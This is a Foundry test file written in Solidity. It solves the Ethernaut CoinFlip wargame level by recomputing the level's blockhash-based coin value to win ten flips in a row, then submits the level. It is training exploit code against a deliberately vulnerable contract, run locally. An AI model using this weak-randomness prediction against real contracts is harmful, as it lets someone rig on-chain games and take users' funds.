pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { CoinFlip } from "src/CoinFlip/CoinFlip.sol";
import { CoinFlipFactory } from "src/CoinFlip/CoinFlipFactory.sol";
import { Ethernaut } from "src/Ethernaut.sol";

contract CoinflipTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");
    uint256 constant FACTOR =
        57_896_044_618_658_097_711_785_492_504_343_953_926_634_992_332_820_282_019_728_792_003_956_564_819_968;

    function setUp() external {
        ethernaut = new Ethernaut();
        vm.deal(me, 5 ether);
    }

    function testCoinflipHack() external {
        // level setup
        CoinFlipFactory coinflipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinflipFactory);
        vm.startPrank(me);
        address levelAddress = ethernaut.createLevelInstance(coinflipFactory);
        CoinFlip coinflip = CoinFlip(payable(levelAddress));

        // attack
        uint256 consecutiveWins = 0;
        // start the index from 1 cause 0 will make the blockValue == initial lastHash
        for (uint256 i = 1; i <= 10; i++) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            uint256 coinFlip = blockValue / FACTOR;

            // guess the result
            bool guess = coinFlip == 1 ? true : false;
            coinflip.flip(guess);
            require(coinflip.consecutiveWins() == consecutiveWins + 1);
            consecutiveWins++;

            if (consecutiveWins == 10) {
                break;
            }
            // increase block number
            vm.roll(i + 1);
        }

        // submission
        bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelPassed);
    }
}
